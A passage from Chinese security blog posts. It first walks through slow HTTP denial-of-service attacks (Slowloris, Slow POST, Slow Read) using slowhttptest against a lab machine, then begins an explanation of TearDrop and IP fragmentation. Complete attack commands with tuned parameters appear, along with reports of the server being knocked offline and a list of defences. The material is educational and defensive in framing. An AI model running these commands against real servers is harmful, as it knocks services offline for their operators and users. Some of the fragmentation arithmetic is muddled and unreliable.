<h2 id="Slowloris攻击实战"><a href="#Slowloris攻击实战" class="headerlink" title="Slowloris攻击实战"></a><strong>Slowloris</strong>攻击实战</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><h4 id="1-Mac端的Slowhttptest"><a href="#1-Mac端的Slowhttptest" class="headerlink" title="1. Mac端的Slowhttptest"></a>1. Mac端的Slowhttptest</h4><h4 id="2-靶机metasploitable-2-0-emsp-IP-192-168-1-103"><a href="#2-靶机metasploitable-2-0-emsp-IP-192-168-1-103" class="headerlink" title="2. 靶机metasploitable 2.0 &emsp;IP=192.168.1.103"></a>2. 靶机metasploitable 2.0 &emsp;IP=192.168.1.103</h4><h3 id="实战演示"><a href="#实战演示" class="headerlink" title="实战演示"></a>实战演示</h3><blockquote>
<p>ulimit -n 1024 &amp;&amp; slowhttptest -c 1000 -H -g -o /Users/apple1/Desktop/my_header_stats -i 10 -r 100 -t GET -u <a href="https://host.example.com/index.html" target="_blank" rel="external">https://host.example.com/index.html</a> -x 24 -p 3</p>
<h4 id="———————————————————"><a href="#———————————————————" class="headerlink" title="———————————————————"></a>———————————————————</h4><p>[ ulimit -n 1024 ] 指定同一时间能并发打开的文件数为 1024；&emsp;   [ -c 1000 ] 指定测试过程中与目标建立的连接数为1000；&emsp; [ -H ]  指定开始SlowLoris攻击模式并发送未完成的HTTP请求；&emsp;[ -g -o my_header_stats ] 让Slowhttptest生成CSV和HTML的报告文件,并指定路径／文件名 ；&emsp; [ -i 10 ] Specifies the interval between follow up data ；&emsp; [ -r 100 ]  指定连接速率为100/s ； &emsp;[ -t GET ] 通过GET方式连接 ； &emsp; [ -u <a href="https://host.example.com/index.html" target="_blank" rel="external">https://host.example.com/index.html</a> ]指定URL； &emsp; [ -x 24 ] 启用慢速读取测试； &emsp; [ -p 3 ] 官方：在判断server被DoS之前，发送连接请求之后，等待HTTP response的时间间隔为3S || 笔者：client发送request请求3S内没接收到server的response就标志服务器被DoS </p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/fd2a33c96b9948cf7a2edb4950c6f04f/xmlnote/D3BC7F6FD23140DBB947B632A70D837B/2142" alt="image"></p>
<h3 id="可以看到几秒钟web服务器的连接池就被占满无法访问，下面是生成的html报告"><a href="#可以看到几秒钟web服务器的连接池就被占满无法访问，下面是生成的html报告" class="headerlink" title="[*]可以看到几秒钟web服务器的连接池就被占满无法访问，下面是生成的html报告"></a>[*]可以看到几秒钟web服务器的连接池就被占满无法访问，下面是生成的html报告</h3><p><img src="http://note.youdao.com/yws/public/resource/fd2a33c96b9948cf7a2edb4950c6f04f/xmlnote/A198B372BDAD4A2E91DCED2BC84E0D66/2146" alt="image"></p>
<hr>
<h1 id="0x03-Slow-Http-Post模式"><a href="#0x03-Slow-Http-Post模式" class="headerlink" title="0x03. Slow Http Post模式"></a>0x03. Slow Http Post模式</h1><h2 id="Slow-Http-Post攻击原理"><a href="#Slow-Http-Post攻击原理" class="headerlink" title="Slow Http Post攻击原理"></a>Slow Http Post攻击原理</h2><h4 id="1-Slow-Http-Post也称作Slow-body-其本质也是通过耗尽服务器的连接池来达到攻击目的，而且攻击过程和上面提到的Slowloris差不多"><a href="#1-Slow-Http-Post也称作Slow-body-其本质也是通过耗尽服务器的连接池来达到攻击目的，而且攻击过程和上面提到的Slowloris差不多" class="headerlink" title="1. Slow Http Post也称作Slow body,其本质也是通过耗尽服务器的连接池来达到攻击目的，而且攻击过程和上面提到的Slowloris差不多"></a>1. Slow Http Post也称作Slow body,其本质也是通过耗尽服务器的连接池来达到攻击目的，而且攻击过程和上面提到的Slowloris差不多</h4><h4 id="2-在Post攻击中http-header头是完整发送的，但是这里会利用header头里面的content-length字段，正常情况下content-length的长度就是所要发送的数据长度，但是攻击者可以定制client发送的content-length，于是如果攻击者发送一个content-length特别大的值，那么server就会等待后续没有传完的body内容"><a href="#2-在Post攻击中http-header头是完整发送的，但是这里会利用header头里面的content-length字段，正常情况下content-length的长度就是所要发送的数据长度，但是攻击者可以定制client发送的content-length，于是如果攻击者发送一个content-length特别大的值，那么server就会等待后续没有传完的body内容" class="headerlink" title="2. 在Post攻击中http header头是完整发送的，但是这里会利用header头里面的content-length字段，正常情况下content-length的长度就是所要发送的数据长度，但是攻击者可以定制client发送的content-length，于是如果攻击者发送一个content-length特别大的值，那么server就会等待后续没有传完的body内容"></a>2. 在Post攻击中http header头是完整发送的，但是这里会利用header头里面的content-length字段，正常情况下content-length的长度就是所要发送的数据长度，但是攻击者可以定制client发送的content-length，于是如果攻击者发送一个content-length特别大的值，那么server就会等待后续没有传完的body内容</h4><h4 id="3-此时攻击者会延迟发送后续的body甚至是不发送，但是server端依旧会在等待并为其保留连接池并持续等待后续信息直到连接超时"><a href="#3-此时攻击者会延迟发送后续的body甚至是不发送，但是server端依旧会在等待并为其保留连接池并持续等待后续信息直到连接超时" class="headerlink" title="3. 此时攻击者会延迟发送后续的body甚至是不发送，但是server端依旧会在等待并为其保留连接池并持续等待后续信息直到连接超时"></a>3. 此时攻击者会延迟发送后续的body甚至是不发送，但是server端依旧会在等待并为其保留连接池并持续等待后续信息直到连接超时</h4><h4 id="4-问题来了，如果攻击者与服务器建立大量连接，而且都告诉server后续还要传输数据，那么server的连接池到达一定程度时就会被占满达到DoS攻击"><a href="#4-问题来了，如果攻击者与服务器建立大量连接，而且都告诉server后续还要传输数据，那么server的连接池到达一定程度时就会被占满达到DoS攻击" class="headerlink" title="4. 问题来了，如果攻击者与服务器建立大量连接，而且都告诉server后续还要传输数据，那么server的连接池到达一定程度时就会被占满达到DoS攻击"></a>4. 问题来了，如果攻击者与服务器建立大量连接，而且都告诉server后续还要传输数据，那么server的连接池到达一定程度时就会被占满达到DoS攻击</h4><h3 id="如果对上述原理不太理解，笔者给大家描述一个生活中常见的场景：当大家在麦当劳点餐的时候，最前面点餐的那个人点了一个汉堡，于是开始付钱，先付了一毛，给收银员说等我找找钱放哪了再付剩下的钱，但是又一直找不到不给，就一直霸站着收银台导致后面的客人无法点餐，如果德克士的每个收银台都被这样的客人霸占着，那么最后就会导致麦当劳无法做生意了，也就造成了DoS"><a href="#如果对上述原理不太理解，笔者给大家描述一个生活中常见的场景：当大家在麦当劳点餐的时候，最前面点餐的那个人点了一个汉堡，于是开始付钱，先付了一毛，给收银员说等我找找钱放哪了再付剩下的钱，但是又一直找不到不给，就一直霸站着收银台导致后面的客人无法点餐，如果德克士的每个收银台都被这样的客人霸占着，那么最后就会导致麦当劳无法做生意了，也就造成了DoS" class="headerlink" title="[*]如果对上述原理不太理解，笔者给大家描述一个生活中常见的场景：当大家在麦当劳点餐的时候，最前面点餐的那个人点了一个汉堡，于是开始付钱，先付了一毛，给收银员说等我找找钱放哪了再付剩下的钱，但是又一直找不到不给，就一直霸站着收银台导致后面的客人无法点餐，如果德克士的每个收银台都被这样的客人霸占着，那么最后就会导致麦当劳无法做生意了，也就造成了DoS"></a>[*]如果对上述原理不太理解，笔者给大家描述一个生活中常见的场景：当大家在麦当劳点餐的时候，最前面点餐的那个人点了一个汉堡，于是开始付钱，先付了一毛，给收银员说等我找找钱放哪了再付剩下的钱，但是又一直找不到不给，就一直霸站着收银台导致后面的客人无法点餐，如果德克士的每个收银台都被这样的客人霸占着，那么最后就会导致麦当劳无法做生意了，也就造成了DoS</h3><hr>
<h2 id="Slow-Http-Post攻击实战"><a href="#Slow-Http-Post攻击实战" class="headerlink" title="Slow Http Post攻击实战"></a>Slow Http Post攻击实战</h2><blockquote>
<p>ulimit -n 4096 &amp;&amp; slowhttptest -c 3000 -B -g -o /Users/apple1/Desktop/my_body_stats -i 110 -r 100 -s 8192 -t GET -u <a href="http://host.example.com/loginform.html" target="_blank" rel="external">http://host.example.com/loginform.html</a> -x 10 -p 3</p>
<h4 id="————————————————–"><a href="#————————————————–" class="headerlink" title="————————————————–"></a>————————————————–</h4><p>[ -B ] 启用Slow Http Post模式发送未完成的HTTP消息体； &emsp; [ -s ] 指定content-length长度为8192；</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/fd2a33c96b9948cf7a2edb4950c6f04f/xmlnote/215B04DDF5E647B488A009620A396817/2215" alt="image"></p>
<h3 id="下面是生成的报告"><a href="#下面是生成的报告" class="headerlink" title="[*]下面是生成的报告"></a>[*]下面是生成的报告</h3><p><img src="http://note.youdao.com/yws/public/resource/fd2a33c96b9948cf7a2edb4950c6f04f/xmlnote/34A759088BA449CB9CED8D6E2BD90C12/2217" alt="image"></p>
<hr>
<h1 id="0x04-Slow-Read-attack模式"><a href="#0x04-Slow-Read-attack模式" class="headerlink" title="0x04. Slow Read attack模式"></a>0x04. Slow Read attack模式</h1><h2 id="Slow-Read-attack攻击原理"><a href="#Slow-Read-attack攻击原理" class="headerlink" title="Slow Read attack攻击原理"></a>Slow Read attack攻击原理</h2><h4 id="1-正如名字所描述的那样，就是慢速读取server传输过来的数据，如果大家看过我的sockstress那篇文章可知client可以通过控制TCP的window-size来控制传输速率"><a href="#1-正如名字所描述的那样，就是慢速读取server传输过来的数据，如果大家看过我的sockstress那篇文章可知client可以通过控制TCP的window-size来控制传输速率" class="headerlink" title="1. 正如名字所描述的那样，就是慢速读取server传输过来的数据，如果大家看过我的sockstress那篇文章可知client可以通过控制TCP的window size来控制传输速率"></a>1. 正如名字所描述的那样，就是慢速读取server传输过来的数据，如果大家看过我的sockstress那篇文章可知client可以通过控制TCP的window size来控制传输速率</h4><h4 id="2-如果攻击者将window-size置为一个特别小的值，但是却又请求一个特别大的资源，那么服务器就会与这个连接进行长时间通信，如果建立的连接数足够大就会塞满server的连接池"><a href="#2-如果攻击者将window-size置为一个特别小的值，但是却又请求一个特别大的资源，那么服务器就会与这个连接进行长时间通信，如果建立的连接数足够大就会塞满server的连接池" class="headerlink" title="2. 如果攻击者将window size置为一个特别小的值，但是却又请求一个特别大的资源，那么服务器就会与这个连接进行长时间通信，如果建立的连接数足够大就会塞满server的连接池"></a>2. 如果攻击者将window size置为一个特别小的值，但是却又请求一个特别大的资源，那么服务器就会与这个连接进行长时间通信，如果建立的连接数足够大就会塞满server的连接池</h4><h4 id="3-当server端缓冲区未发送的资源堆积过多时还会导致缓冲区溢出，也无法响应其他请求"><a href="#3-当server端缓冲区未发送的资源堆积过多时还会导致缓冲区溢出，也无法响应其他请求" class="headerlink" title="3. 当server端缓冲区未发送的资源堆积过多时还会导致缓冲区溢出，也无法响应其他请求"></a>3. 当server端缓冲区未发送的资源堆积过多时还会导致缓冲区溢出，也无法响应其他请求</h4><h4 id="4-正如漏斗一样，漏斗口很小，但是我们却一个劲的往里面装沙子，这样迟早把漏斗涨满"><a href="#4-正如漏斗一样，漏斗口很小，但是我们却一个劲的往里面装沙子，这样迟早把漏斗涨满" class="headerlink" title="4. 正如漏斗一样，漏斗口很小，但是我们却一个劲的往里面装沙子，这样迟早把漏斗涨满"></a>4. 正如漏斗一样，漏斗口很小，但是我们却一个劲的往里面装沙子，这样迟早把漏斗涨满</h4><hr>
<h2 id="Slow-Read-attack攻击实战"><a href="#Slow-Read-attack攻击实战" class="headerlink" title="Slow Read attack攻击实战"></a>Slow Read attack攻击实战</h2><blockquote>
<p>ulimit -n 8000 &amp;&amp; slowhttptest -c 8000 -X -r 100 -g -o /Users/apple1/Desktop/my_header_stats -w 512 -y 1024 -n 5 -z 32 -k 3 -u <a href="https://host.example.com/resources/index.html" target="_blank" rel="external">https://host.example.com/resources/index.html</a> -p 3</p>
<h4 id="————————————————–-1"><a href="#————————————————–-1" class="headerlink" title="————————————————–"></a>————————————————–</h4><p>[ -X ] 指定使用Slow Read attack模式，缓慢读取HTTP响应请求； &emsp; [ -w 512 -y 1024 ] 指定window size大小为512~1024 byte； &emsp; [ -n 5 ] 指定读取数据的间隔为5S； &emsp; [ -z 32 ] 指定每次从接收数据的缓冲区中读取数据的长度为5 byte； &emsp; [ -k 3 ] 在同一连接中重复请求的次数为3次</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/fd2a33c96b9948cf7a2edb4950c6f04f/xmlnote/2FDA2F17DE3F4B4F83D431FECF90E94B/2271" alt="image"></p>
<h3 id="这次服务器不仅被DoS了，而且因为缓冲区溢出导致CPU被大量占用，导致无法执行其它系统命令"><a href="#这次服务器不仅被DoS了，而且因为缓冲区溢出导致CPU被大量占用，导致无法执行其它系统命令" class="headerlink" title="[*]这次服务器不仅被DoS了，而且因为缓冲区溢出导致CPU被大量占用，导致无法执行其它系统命令"></a>[*]这次服务器不仅被DoS了，而且因为缓冲区溢出导致CPU被大量占用，导致无法执行其它系统命令</h3><p><img src="http://note.youdao.com/yws/public/resource/fd2a33c96b9948cf7a2edb4950c6f04f/xmlnote/58E1534C04904F039062A35374EF529D/2275" alt="image"><br><img src="http://note.youdao.com/yws/public/resource/fd2a33c96b9948cf7a2edb4950c6f04f/xmlnote/B1142AF04FD44CEAA67BE9CFE983148F/2270" alt="image"></p>
<hr>
<h2 id="0x05-防御策略"><a href="#0x05-防御策略" class="headerlink" title="0x05. 防御策略"></a>0x05. 防御策略</h2><h4 id="1-将标题和消息体限制在最小的合理长度上。针对接受数据的每个资源，设置更严格的特定于URL的限制。"><a href="#1-将标题和消息体限制在最小的合理长度上。针对接受数据的每个资源，设置更严格的特定于URL的限制。" class="headerlink" title="1. 将标题和消息体限制在最小的合理长度上。针对接受数据的每个资源，设置更严格的特定于URL的限制。"></a>1. 将标题和消息体限制在最小的合理长度上。针对接受数据的每个资源，设置更严格的特定于URL的限制。</h4><h4 id="2-设置合理的连接超时时间"><a href="#2-设置合理的连接超时时间" class="headerlink" title="2. 设置合理的连接超时时间"></a>2. 设置合理的连接超时时间</h4><h4 id="3-定义最小传入数据速率，并删除比该速率慢的连接"><a href="#3-定义最小传入数据速率，并删除比该速率慢的连接" class="headerlink" title="3. 定义最小传入数据速率，并删除比该速率慢的连接"></a>3. 定义最小传入数据速率，并删除比该速率慢的连接</h4><h4 id="4-如果Web服务器从相同的IP接收到数千个连接，同一个用户代理在短时间内请求相同的资源，直接禁掉IP并且记录日志"><a href="#4-如果Web服务器从相同的IP接收到数千个连接，同一个用户代理在短时间内请求相同的资源，直接禁掉IP并且记录日志" class="headerlink" title="4. 如果Web服务器从相同的IP接收到数千个连接，同一个用户代理在短时间内请求相同的资源，直接禁掉IP并且记录日志"></a>4. 如果Web服务器从相同的IP接收到数千个连接，同一个用户代理在短时间内请求相同的资源，直接禁掉IP并且记录日志</h4><blockquote>
<p>具体的防御策略大家可以参考这篇<a href="http://blog.shekyan.com/2011/11/how-to-protect-against-slow-http-attacks.html" target="_blank" rel="external">文章</a></p>
</blockquote>
<hr>
<h2 id="0x06-结语"><a href="#0x06-结语" class="headerlink" title="0x06. 结语"></a>0x06. 结语</h2><h4 id="emsp-emsp-笔者的英文水平不是很好，但是这个工具国内资源又很少，不得不去看英文文章，所以可能有部分参数内容翻译不准确，还望大家多多指正！！"><a href="#emsp-emsp-笔者的英文水平不是很好，但是这个工具国内资源又很少，不得不去看英文文章，所以可能有部分参数内容翻译不准确，还望大家多多指正！！" class="headerlink" title="&emsp;&emsp;笔者的英文水平不是很好，但是这个工具国内资源又很少，不得不去看英文文章，所以可能有部分参数内容翻译不准确，还望大家多多指正！！"></a>&emsp;&emsp;笔者的英文水平不是很好，但是这个工具国内资源又很少，不得不去看英文文章，所以可能有部分参数内容翻译不准确，还望大家多多指正！！</h4>]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[TearDrop]]></title>
      <url>/2017/09/24/TearDrop/</url>
      <content type="html"><![CDATA[<h2 id="0x00-TearDrop简介"><a href="#0x00-TearDrop简介" class="headerlink" title="0x00. TearDrop简介"></a>0x00. TearDrop简介</h2><h4 id="emsp-emsp-TearDrop是存在于上个世纪的拒绝服务攻击，尽管对现代的电脑已经基本不管用了，但是了解它的原理仍然是我们需要掌握的，这篇文章笔者是写给自己看的，大家不感兴趣的话可以绕过。"><a href="#emsp-emsp-TearDrop是存在于上个世纪的拒绝服务攻击，尽管对现代的电脑已经基本不管用了，但是了解它的原理仍然是我们需要掌握的，这篇文章笔者是写给自己看的，大家不感兴趣的话可以绕过。" class="headerlink" title="&emsp;&emsp;TearDrop是存在于上个世纪的拒绝服务攻击，尽管对现代的电脑已经基本不管用了，但是了解它的原理仍然是我们需要掌握的，这篇文章笔者是写给自己看的，大家不感兴趣的话可以绕过。"></a>&emsp;&emsp;TearDrop是存在于上个世纪的拒绝服务攻击，尽管对现代的电脑已经基本不管用了，但是了解它的原理仍然是我们需要掌握的，这篇文章笔者是写给自己看的，大家不感兴趣的话可以绕过。</h4><a id="more"></a>
<hr>
<h2 id="0x01-数据链路层包结构分析"><a href="#0x01-数据链路层包结构分析" class="headerlink" title="0x01. 数据链路层包结构分析"></a>0x01. 数据链路层包结构分析</h2><p><img src="http://note.youdao.com/yws/public/resource/237c23bc1c03cfdf0c70f705bb0720f5/xmlnote/B533EFC592AA4E939434C55AB3F8E3DD/1714" alt="image"></p>
<h3 id="这是一个完整的数据链路层数据包结构图，下面笔者将介绍其中具体的包结构信息"><a href="#这是一个完整的数据链路层数据包结构图，下面笔者将介绍其中具体的包结构信息" class="headerlink" title="[*]这是一个完整的数据链路层数据包结构图，下面笔者将介绍其中具体的包结构信息"></a>[*]这是一个完整的数据链路层数据包结构图，下面笔者将介绍其中具体的包结构信息</h3><h4 id="1-目的地址：数据包目标MAC地址"><a href="#1-目的地址：数据包目标MAC地址" class="headerlink" title="1. 目的地址：数据包目标MAC地址"></a>1. 目的地址：数据包目标MAC地址</h4><h4 id="2-源地址：数据包来源MAC地址"><a href="#2-源地址：数据包来源MAC地址" class="headerlink" title="2. 源地址：数据包来源MAC地址"></a>2. 源地址：数据包来源MAC地址</h4><h4 id="3-类型：代表上层协议，对于数据链路层来说它的上层协议是IP协议-0x0800"><a href="#3-类型：代表上层协议，对于数据链路层来说它的上层协议是IP协议-0x0800" class="headerlink" title="3. 类型：代表上层协议，对于数据链路层来说它的上层协议是IP协议(0x0800)"></a>3. 类型：代表上层协议，对于数据链路层来说它的上层协议是IP协议(0x0800)</h4><h4 id="4-数据：数据部分中包含有上层协议数据，对于数据链路层来说就是网络层、传输层、应用层，占46-1500字节，也就是最大容纳的数据量是1500字节"><a href="#4-数据：数据部分中包含有上层协议数据，对于数据链路层来说就是网络层、传输层、应用层，占46-1500字节，也就是最大容纳的数据量是1500字节" class="headerlink" title="4. 数据：数据部分中包含有上层协议数据，对于数据链路层来说就是网络层、传输层、应用层，占46-1500字节，也就是最大容纳的数据量是1500字节"></a>4. 数据：数据部分中包含有上层协议数据，对于数据链路层来说就是网络层、传输层、应用层，占46-1500字节，也就是最大容纳的数据量是1500字节</h4><h4 id="5-FCS：FCS是数据帧校验位，用于确定数据包在传输过程中是否损坏"><a href="#5-FCS：FCS是数据帧校验位，用于确定数据包在传输过程中是否损坏" class="headerlink" title="5. FCS：FCS是数据帧校验位，用于确定数据包在传输过程中是否损坏"></a>5. FCS：FCS是数据帧校验位，用于确定数据包在传输过程中是否损坏</h4><hr>
<h2 id="0x02-IP数据包分析"><a href="#0x02-IP数据包分析" class="headerlink" title="0x02.IP数据包分析"></a>0x02.IP数据包分析</h2><p><img src="http://note.youdao.com/yws/public/resource/237c23bc1c03cfdf0c70f705bb0720f5/xmlnote/A11DDBD9481A44AD9849AFB9291744C9/1745" alt="image"></p>
<h3 id="上图相当于数据链路层的数据部分的详细结构"><a href="#上图相当于数据链路层的数据部分的详细结构" class="headerlink" title="[*]上图相当于数据链路层的数据部分的详细结构"></a>[*]上图相当于数据链路层的数据部分的详细结构</h3><h4 id="接下来分析一下IP数据包中主要的字段信息，也正是在IP数据包中会存在TearDrop攻击的原理："><a href="#接下来分析一下IP数据包中主要的字段信息，也正是在IP数据包中会存在TearDrop攻击的原理：" class="headerlink" title="接下来分析一下IP数据包中主要的字段信息，也正是在IP数据包中会存在TearDrop攻击的原理："></a>接下来分析一下IP数据包中主要的字段信息，也正是在IP数据包中会存在TearDrop攻击的原理：</h4><h4 id="1-Version：IP协议版本信息，现在一般是IPV4，占4bit-看清楚，是比特不是字节"><a href="#1-Version：IP协议版本信息，现在一般是IPV4，占4bit-看清楚，是比特不是字节" class="headerlink" title="1. Version：IP协议版本信息，现在一般是IPV4，占4bit(看清楚，是比特不是字节)"></a>1. Version：IP协议版本信息，现在一般是IPV4，占4bit(看清楚，是比特不是字节)</h4><h4 id="2-Total-Length：IP数据包的总长度"><a href="#2-Total-Length：IP数据包的总长度" class="headerlink" title="2. Total Length：IP数据包的总长度"></a>2. Total Length：IP数据包的总长度</h4><h4 id="3-Identification：该字段标记当前分片为第几个分片，当数据量过大超过1480字节时，IP层会将数据分段多次传输，但是都会带有相同的Identification来表示这是同一段数据，当接收端接受到所有的数据之后又会将这些小段数据重组成原来的报文数据"><a href="#3-Identification：该字段标记当前分片为第几个分片，当数据量过大超过1480字节时，IP层会将数据分段多次传输，但是都会带有相同的Identification来表示这是同一段数据，当接收端接受到所有的数据之后又会将这些小段数据重组成原来的报文数据" class="headerlink" title="3. Identification：该字段标记当前分片为第几个分片，当数据量过大超过1480字节时，IP层会将数据分段多次传输，但是都会带有相同的Identification来表示这是同一段数据，当接收端接受到所有的数据之后又会将这些小段数据重组成原来的报文数据"></a>3. Identification：该字段标记当前分片为第几个分片，当数据量过大超过1480字节时，IP层会将数据分段多次传输，但是都会带有相同的Identification来表示这是同一段数据，当接收端接受到所有的数据之后又会将这些小段数据重组成原来的报文数据</h4><h4 id="4-Flags：标志位，表示该报文是否分片，如果置为0x01则表示后面还有数据需要接受，与Identification一样是用来控制大数据-超过1480byte-传输的"><a href="#4-Flags：标志位，表示该报文是否分片，如果置为0x01则表示后面还有数据需要接受，与Identification一样是用来控制大数据-超过1480byte-传输的" class="headerlink" title="4. Flags：标志位，表示该报文是否分片，如果置为0x01则表示后面还有数据需要接受，与Identification一样是用来控制大数据(超过1480byte)传输的"></a>4. Flags：标志位，表示该报文是否分片，如果置为0x01则表示后面还有数据需要接受，与Identification一样是用来控制大数据(超过1480byte)传输的</h4><h4 id="5-Fragment-Offset：片偏移，当需要分片传输数据时用来表示当前分片在原数据字段的偏移量，以后重组数据时的排序依据"><a href="#5-Fragment-Offset：片偏移，当需要分片传输数据时用来表示当前分片在原数据字段的偏移量，以后重组数据时的排序依据" class="headerlink" title="5. Fragment Offset：片偏移，当需要分片传输数据时用来表示当前分片在原数据字段的偏移量，以后重组数据时的排序依据"></a>5. Fragment Offset：片偏移，当需要分片传输数据时用来表示当前分片在原数据字段的偏移量，以后重组数据时的排序依据</h4><h4 id="6-Time-To-Live：也就是常说的TTL值，表示当前报文还能生存多久，每经过一个路由器TTL值减一，用来减少网络垃圾"><a href="#6-Time-To-Live：也就是常说的TTL值，表示当前报文还能生存多久，每经过一个路由器TTL值减一，用来减少网络垃圾" class="headerlink" title="6. Time To Live：也就是常说的TTL值，表示当前报文还能生存多久，每经过一个路由器TTL值减一，用来减少网络垃圾"></a>6. Time To Live：也就是常说的TTL值，表示当前报文还能生存多久，每经过一个路由器TTL值减一，用来减少网络垃圾</h4><h4 id="7-Protocol：表示上层所用的协议，IP层上层协议可能是UDP、TCP、ICMP等"><a href="#7-Protocol：表示上层所用的协议，IP层上层协议可能是UDP、TCP、ICMP等" class="headerlink" title="7. Protocol：表示上层所用的协议，IP层上层协议可能是UDP、TCP、ICMP等"></a>7. Protocol：表示上层所用的协议，IP层上层协议可能是UDP、TCP、ICMP等</h4><h4 id="8-Source-IP-Address：源IP-emsp-emsp-Destination-IP-Address：目标IP"><a href="#8-Source-IP-Address：源IP-emsp-emsp-Destination-IP-Address：目标IP" class="headerlink" title="8. Source IP Address：源IP &emsp;&emsp;Destination IP Address：目标IP"></a>8. Source IP Address：源IP &emsp;&emsp;Destination IP Address：目标IP</h4><h4 id="9-Data：IP数据包实际传输的数据，当然所指的数据和IP包结构类似，需要层层划分才能得到真正传输的数据"><a href="#9-Data：IP数据包实际传输的数据，当然所指的数据和IP包结构类似，需要层层划分才能得到真正传输的数据" class="headerlink" title="9. Data：IP数据包实际传输的数据，当然所指的数据和IP包结构类似，需要层层划分才能得到真正传输的数据"></a>9. Data：IP数据包实际传输的数据，当然所指的数据和IP包结构类似，需要层层划分才能得到真正传输的数据</h4><h3 id="上面所介绍的IP包头总共占用20byte，所以Data部分最多还能传输1480byte的数据"><a href="#上面所介绍的IP包头总共占用20byte，所以Data部分最多还能传输1480byte的数据" class="headerlink" title="[*]上面所介绍的IP包头总共占用20byte，所以Data部分最多还能传输1480byte的数据"></a>[*]上面所介绍的IP包头总共占用20byte，所以Data部分最多还能传输1480byte的数据</h3><hr>
<h2 id="0x03-ICMP数据包抓包分析"><a href="#0x03-ICMP数据包抓包分析" class="headerlink" title="0x03. ICMP数据包抓包分析"></a>0x03. ICMP数据包抓包分析</h2><h4 id="emsp-emsp-上面介绍了这么多原理性的概念，那么接下来笔者实际抓取一些数据包来给大家分析看看包头结构。"><a href="#emsp-emsp-上面介绍了这么多原理性的概念，那么接下来笔者实际抓取一些数据包来给大家分析看看包头结构。" class="headerlink" title="&emsp;&emsp;上面介绍了这么多原理性的概念，那么接下来笔者实际抓取一些数据包来给大家分析看看包头结构。"></a>&emsp;&emsp;上面介绍了这么多原理性的概念，那么接下来笔者实际抓取一些数据包来给大家分析看看包头结构。</h4><h3 id="通过抓取ICMP数据包就可以很好的分析IP包结构，因为此时抓取到的数据包中IP上层协议只有ICMP，所以Data部分就只表示ICMP协议数据，没有更高层协议的影响"><a href="#通过抓取ICMP数据包就可以很好的分析IP包结构，因为此时抓取到的数据包中IP上层协议只有ICMP，所以Data部分就只表示ICMP协议数据，没有更高层协议的影响" class="headerlink" title="[*]通过抓取ICMP数据包就可以很好的分析IP包结构，因为此时抓取到的数据包中IP上层协议只有ICMP，所以Data部分就只表示ICMP协议数据，没有更高层协议的影响"></a>[*]通过抓取ICMP数据包就可以很好的分析IP包结构，因为此时抓取到的数据包中IP上层协议只有ICMP，所以Data部分就只表示ICMP协议数据，没有更高层协议的影响</h3><blockquote>
<p>sudo ping xx.xx.xx.xx -c 3 -s 5912</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/237c23bc1c03cfdf0c70f705bb0720f5/xmlnote/B15FCD14ADF4465A906C5C5594C1DE05/1884" alt="image"></p>
<h4 id="先介绍一下我所使用的命令，ping表示发送ICMP数据包，-c-3表示总共发3个ICMP层的数据包，-s-5912表示每个ICMP数据包中的数据量为5912-byte。"><a href="#先介绍一下我所使用的命令，ping表示发送ICMP数据包，-c-3表示总共发3个ICMP层的数据包，-s-5912表示每个ICMP数据包中的数据量为5912-byte。" class="headerlink" title="[*]先介绍一下我所使用的命令，ping表示发送ICMP数据包，-c 3表示总共发3个ICMP层的数据包，-s 5912表示每个ICMP数据包中的数据量为5912 byte。"></a>[*]先介绍一下我所使用的命令，ping表示发送ICMP数据包，-c 3表示总共发3个ICMP层的数据包，-s 5912表示每个ICMP数据包中的数据量为5912 byte。</h4><h4 id="之所以要用5912-byte，是为了满足1478-4-2-4-5920-也就是一个5912-byte大小的ICMP包一次性肯定发不完，所以需要分片发送，一个数据包发送的Data段最多为1480-1478-2-也就是我们所要求的数据-1478-byte-加上2-byte的Protocol协议号，这样分成4片刚好能发完"><a href="#之所以要用5912-byte，是为了满足1478-4-2-4-5920-也就是一个5912-byte大小的ICMP包一次性肯定发不完，所以需要分片发送，一个数据包发送的Data段最多为1480-1478-2-也就是我们所要求的数据-1478-byte-加上2-byte的Protocol协议号，这样分成4片刚好能发完" class="headerlink" title="[]之所以要用5912 byte，是为了满足1478\4 + 2*4 = 5920 ,也就是一个5912 byte大小的ICMP包一次性肯定发不完，所以需要分片发送，一个数据包发送的Data段最多为1480 = 1478 + 2 ,也就是我们所要求的数据(1478 byte)加上2 byte的Protocol协议号，这样分成4片刚好能发完"></a>[<em>]之所以要用5912 byte，是为了满足1478\</em>4 + 2*4 = 5920 ,也就是一个5912 byte大小的ICMP包一次性肯定发不完，所以需要分片发送，一个数据包发送的Data段最多为1480 = 1478 + 2 ,也就是我们所要求的数据(1478 byte)加上2 byte的Protocol协议号，这样分成4片刚好能发完</h4><h4 id="上面就是我所抓取到的数据包，可以看到包的Total-Length是1500-byte，包头占了20-byte，剩下的Data全部占满，占用了1480-byte。刚好分成4片传输5920-byte的Data"><a href="#上面就是我所抓取到的数据包，可以看到包的Total-Length是1500-byte，包头占了20-byte，剩下的Data全部占满，占用了1480-byte。刚好分成4片传输5920-byte的Data" class="headerlink" title="[*]上面就是我所抓取到的数据包，可以看到包的Total Length是1500 byte，包头占了20 byte，剩下的Data全部占满，占用了1480 byte。刚好分成4片传输5920 byte的Data"></a>[*]上面就是我所抓取到的数据包，可以看到包的Total Length是1500 byte，包头占了20 byte，剩下的Data全部占满，占用了1480 byte。刚好分成4片传输5920 byte的Data</h4><hr>
